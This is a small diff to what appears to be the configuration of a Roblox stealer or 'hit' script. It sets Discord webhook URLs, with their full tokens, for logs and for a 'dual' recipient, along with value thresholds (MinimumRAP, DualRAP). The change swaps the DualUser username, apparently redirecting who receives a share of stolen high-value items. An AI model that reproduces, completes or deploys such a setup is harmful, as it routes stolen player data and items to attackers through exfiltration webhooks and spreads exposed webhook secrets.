@@ -6,7 +6,7 @@ Webhook = "https://discord.com/api/webhooks/1376605934263992332/CcqFr2XC4hnfy1d-
 MinimumRAP = 5000000
 
 DualRAP = 500000000
-DualUser = "v1leos"
+DualUser = "zenith_msvdpro"
 DualWebhook = "https://discord.com/api/webhooks/1371001195363172452/z3qAJbPtTuUuAqDqI9yBIMR-hZ9Q2XuNUBnLVacoIFgckWfV-Nit7q8NSjG0GlB7vEBr"
 
 LogsWebhook = "https://discord.com/api/webhooks/1371001363332333618/2f6F8WUbJsNoExHDdYWnnFOd9zrHKrQKuhvA249b6JZXAfO8VxUe9lYy_QVwhjaa7Cke"
